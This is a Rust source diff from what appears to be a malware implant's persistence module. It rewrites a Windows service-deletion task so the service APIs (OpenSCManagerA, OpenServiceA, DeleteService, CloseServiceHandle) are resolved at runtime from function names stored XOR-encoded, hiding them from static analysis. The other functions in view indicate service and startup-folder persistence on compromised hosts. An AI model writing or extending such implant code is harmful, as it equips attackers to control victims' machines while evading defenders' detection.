@@ -141,10 +141,57 @@ fn persist_svc(v: &serde_json::Value) -> TaskOutput {
 #[cfg(target_os = "windows")]
 fn persist_svc_remove(v: &serde_json::Value) -> TaskOutput {
     let name = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/svc-rm: missing name") };
-    let cmd = format!("sc delete \"{name}\"");
-    shell_run(&cmd)
-        .map(|out| TaskOutput::success(out))
-        .unwrap_or_else(|e| TaskOutput::failure(&e))
+
+    let adv = adv_base();
+    if adv == 0 { return TaskOutput::failure("persist/svc-rm: advapi32 not found"); }
+
+    type OpenSCMFn  = unsafe extern "system" fn(*const u8, *const u8, u32) -> isize;
+    type OpenSvcFn  = unsafe extern "system" fn(isize, *const u8, u32) -> isize;
+    type DeleteFn   = unsafe extern "system" fn(isize) -> i32;
+    type CloseFn    = unsafe extern "system" fn(isize) -> i32;
+
+    // OpenSCManagerA, OpenServiceA, DeleteService, CloseServiceHandle  (XOR 0x5A)
+    let p_scm  = unsafe { adv_fn(adv, &[0x15,0x2A,0x3F,0x34,0x09,0x19,0x17,0x3B,0x34,0x3B,0x3D,0x3F,0x28,0x1B,0x5A]) };
+    let p_open = unsafe { adv_fn(adv, &[0x15,0x2A,0x3F,0x34,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x1B,0x5A]) };
+    let p_del  = unsafe { adv_fn(adv, &[0x1E,0x3F,0x36,0x3F,0x2E,0x3F,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x5A]) };
+    let p_cls  = unsafe { adv_fn(adv, &[0x19,0x36,0x35,0x29,0x3F,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A]) };
+
+    let (fn_scm, fn_open, fn_del, fn_cls) = match (p_scm, p_open, p_del, p_cls) {
+        (Some(a), Some(b), Some(c), Some(d)) => (
+            unsafe { core::mem::transmute::<_, OpenSCMFn>(a) },
+            unsafe { core::mem::transmute::<_, OpenSvcFn>(b) },
+            unsafe { core::mem::transmute::<_, DeleteFn>(c) },
+            unsafe { core::mem::transmute::<_, CloseFn>(d) },
+        ),
+        _ => return TaskOutput::failure("persist/svc-rm: fn resolve failed"),
+    };
+
+    const SC_MANAGER_CONNECT: u32 = 0x0001;
+    const DELETE: u32 = 0x00010000;
+
+    let scm = unsafe { fn_scm(core::ptr::null(), core::ptr::null(), SC_MANAGER_CONNECT) };
+    if scm == 0 { return TaskOutput::failure("persist/svc-rm: OpenSCManager failed"); }
+
+    let svc_name = match std::ffi::CString::new(name) {
+        Ok(c) => c,
+        Err(_) => { unsafe { fn_cls(scm) }; return TaskOutput::failure("persist/svc-rm: bad name"); }
+    };
+
+    let svc = unsafe { fn_open(scm, svc_name.as_ptr() as *const u8, DELETE) };
+    if svc == 0 {
+        unsafe { fn_cls(scm) };
+        return TaskOutput::failure(&format!("persist/svc-rm: OpenService failed for '{name}'"));
+    }
+
+    let ok = unsafe { fn_del(svc) };
+    unsafe { fn_cls(svc) };
+    unsafe { fn_cls(scm) };
+
+    if ok != 0 {
+        TaskOutput::success(format!("persist/svc-rm: deleted service '{name}'").into_bytes())
+    } else {
+        TaskOutput::failure(&format!("persist/svc-rm: DeleteService failed for '{name}'"))
+    }
 }
 
 // ── Startup folder persistence ────────────────────────────────────────────────
